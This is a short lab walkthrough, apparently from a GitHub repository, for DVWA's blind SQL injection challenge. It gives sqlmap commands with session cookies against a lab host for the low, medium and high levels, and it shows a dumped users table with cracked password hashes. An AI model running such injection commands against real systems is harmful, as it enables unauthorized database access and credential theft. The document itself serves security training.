# Difficulty - Low

[Challange source code](https://github.com/PnzJust/DVWA-v1.10/blob/main/SQL%20Injection%20Blind/Sources/low.php)


I used sqlmap to get all the information that I need.

`sqlmap -u "http://10.10.27.242/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" -H 'Cookie: PHPSESSID=l716o139mqnh62cmetg0o654e7; security=low'` ->  initial scan

`sqlmap -u "http://10.10.27.242/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" -H 'Cookie: PHPSESSID=l716o139mqnh62cmetg0o654e7; security=low' --tables` -> see the database tables

And whatever we need like :
`sqlmap -u "http://10.10.27.242/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" -H 'Cookie: PHPSESSID=l716o139mqnh62cmetg0o654e7; security=low' --dump dvwa`

Response:
```
+---------+---------+-----------------------------+-----------+---------------------------------------------+------------+---------------------+--------------+
| user_id | user    | avatar                      | last_name | password                                    | first_name | last_login          | failed_login |
+---------+---------+-----------------------------+-----------+---------------------------------------------+------------+---------------------+--------------+
| 3       | 1337    | /hackable/users/1337.jpg    | Me        | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Hack       | 2018-10-03 22:09:36 | 0            |
| 1       | admin   | /hackable/users/admin.jpg   | admin     | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin      | 2018-10-03 22:09:36 | 0            |
| 2       | gordonb | /hackable/users/gordonb.jpg | Brown     | e99a18c428cb38d5f260853678922e03 (abc123)   | Gordon     | 2018-10-03 22:09:36 | 0            |
| 4       | pablo   | /hackable/users/pablo.jpg   | Picasso   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Pablo      | 2018-10-03 22:09:36 | 0            |
| 5       | smithy  | /hackable/users/smithy.jpg  | Smith     | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Bob        | 2018-10-03 22:09:36 | 0            |
+---------+---------+-----------------------------+-----------+---------------------------------------------+------------+---------------------+--------------+
```


# Difficulty - Medium

[Challange source code](https://github.com/PnzJust/DVWA-v1.10/blob/main/SQL%20Injection%20Blind/Sources/medium.php)

This time is a POST request. So the command will be:

`sqlmap -u "http://10.10.27.242/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" -H 'Cookie: PHPSESSID=l716o139mqnh62cmetg0o654e7; security=medium' -X POST --data='id=1&Submit=Submit'`


# Difficulty - High

[Challange source code](https://github.com/PnzJust/DVWA-v1.10/blob/main/SQL%20Injection%20Blind/Sources/high.php)



`sqlmap -u 'http://10.10.27.242/vulnerabilities/sqli_blind/' --cookie='id=1; PHPSESSID=l716o139mqnh62cmetg0o654e7; security=high' -X GET -p id --level 2 `

`--level 2` -> force SQLi in headers.

`[INFO] Cookie parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable `


# Difficulty - Impossible

[Challange source code](https://github.com/PnzJust/DVWA-v1.10/blob/main/SQL%20Injection%20Blind/Sources/impossible.php)
